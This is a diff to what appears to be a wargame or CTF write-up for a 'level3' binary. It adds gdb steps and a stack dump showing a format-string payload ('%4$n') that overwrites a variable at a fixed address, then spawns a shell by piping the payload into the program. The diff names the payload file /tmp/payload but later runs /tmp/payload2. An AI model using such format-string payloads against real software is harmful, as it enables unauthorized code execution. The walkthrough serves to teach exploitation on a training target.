@@ -28,8 +28,21 @@ Finally, all is left is to add the 64 characters at address 0x804988c by doing :
 
 python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/payload
 
-and take control of the shell.
+Inspecting our payload in gdb :
+b main
+b * 0x080484d5
+r < /tmp/payload
+x/20wx $esp
 
+0xbffff4f0:     0xbffff500      0x00000200      0xb7fd1ac0      0xb7ff37d0
+0xbffff500:     0x0804988c      0x41414141      0x41414141      0x41414141
+0xbffff510:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff520:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff530:     0x41414141      0x41414141      0x41414141      0x41414141
+
+We see our payload and count our 60 + 4 characters. (15 * 4 + 4)
+
+All is left is to take control of the shell :
 cat /tmp/payload2 - | ./level3
 Wait what?!
 whoami
